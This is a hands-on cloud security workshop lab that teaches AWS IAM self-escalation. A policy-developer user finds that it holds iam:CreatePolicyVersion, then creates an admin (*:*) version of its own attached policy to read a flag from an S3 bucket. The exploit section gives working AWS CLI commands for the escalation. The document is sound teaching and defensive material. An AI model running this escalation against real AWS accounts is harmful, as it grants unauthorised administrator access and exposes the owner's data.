# Lab 2: CreatePolicyVersion — Self-Escalation via Policy Version Manipulation

## Scenario 1: CreatePolicyVersion — Self-Escalation via Policy Version Manipulation

**Category:** Self-Escalation
**Starting Identity:** `iamws-policy-developer-user`
**Target:** Crown jewels in `s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt`

**The Vulnerability:** `iamws-policy-developer-user` can create new versions of IAM policies — including `iamws-developer-tools-policy`, which is attached to their own user. By creating a new version with administrator permissions and setting it as default, they grant themselves full access without touching any other principal or resource.

**Real-world scenario:** Larger orgs often delegate IAM policy management to non-admins — platform engineers, senior developers, policy owners — so the central security team isn't a bottleneck. `iam:CreatePolicyVersion` is the permission they get, almost always with `Resource: "*"` because maintaining a per-policy allowlist is tedious. The catch: that same user is governed by IAM policies too. Any customer-managed policy attached to them is now one they can edit. Creating a new version of their own attached policy that allows `*:*` turns delegated policy management into account admin in a single API call.

### Part A: Identify with iam-recon

You already built the iam-recon graph during [Lab 1: Lab Setup](../lab-1-setup/README.md) (Step 8), so every query in this section runs offline against the cached data — no rescan needed. If `ACCOUNT_ID` is not set in your current shell, set it again:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text --profile iamws-scanner-user)
```

Scope the pathfinding scan to this scenario's principal — no need to scroll through every match in the account-wide view from setup:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-policy-developer-user
```

Expected output:

```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-policy-developer-user — 1 paths matched:

  [iam-001] CreatePolicyVersion (self-escalation)
    Permissions: iam:CreatePolicyVersion
    https://www.pathfinding.cloud/paths/iam-001
```

pathfinding.cloud path `iam-001` is the canonical write-up for this attack family. That entry is iam-recon telling you: "this user has every permission required to execute the `iam-001` self-escalation path."

Confirm the specific permission directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-policy-developer-user \
  --action iam:CreatePolicyVersion
```

Expected output:

```
ALLOW user/iamws-policy-developer-user can call iam:CreatePolicyVersion with *
```

**In the interactive visualization:** launch `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` (the port is dynamic — copy the `http://127.0.0.1:<port>` URL iam-recon prints). The `iamws-policy-developer-user` node is blue: iam-recon has no graph-edge checker for `iam:CreatePolicyVersion`, so this attack is only surfaced by the `pathfinding` command, not by the colored edges in the viz. Clicking the node still shows the pathfinding annotation — the viz color alone doesn't tell the full story.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/iam-001](https://pathfinding.cloud/paths/iam-001):

- **Category:** Self-Escalation
- **Required permission:** `iam:CreatePolicyVersion`
- **Attack:** Create a new policy version with admin permissions and set it as default
- **Impact:** Immediate full account access

**Key insight:** The vulnerability isn't about which policies are being managed — it's about modifying a policy that grants YOUR OWN permissions. Even if the Resource is scoped, as long as the user can modify policies attached to themselves, they can escalate.

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
aws sts get-caller-identity --profile iamws-policy-developer-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-policy-developer-user"
}
```

**Step 2: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Inspect the policy attached to this user**

```bash
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

aws iam get-policy-version \
  --policy-arn $POLICY_ARN --version-id v1 \
  --query 'PolicyVersion.Document' --output json \
  --profile iamws-policy-developer-user
```

The policy grants EC2 read-only access — limited. But notice it's attached to your own user, which means you can modify it.

**Step 4: Create an admin version and set it as default**

```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

No error — the user is allowed to create new policy versions, including ones that grant `*:*`.

**Step 5: Claim the crown jewels**

> [!NOTE]
> IAM policy changes are eventually consistent — the new version can take 5–15 seconds to propagate. If the command below returns 403, wait and retry.

```bash
sleep 15
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

The file contents appear — you escalated from developer to `AdministratorAccess` by modifying your own policy.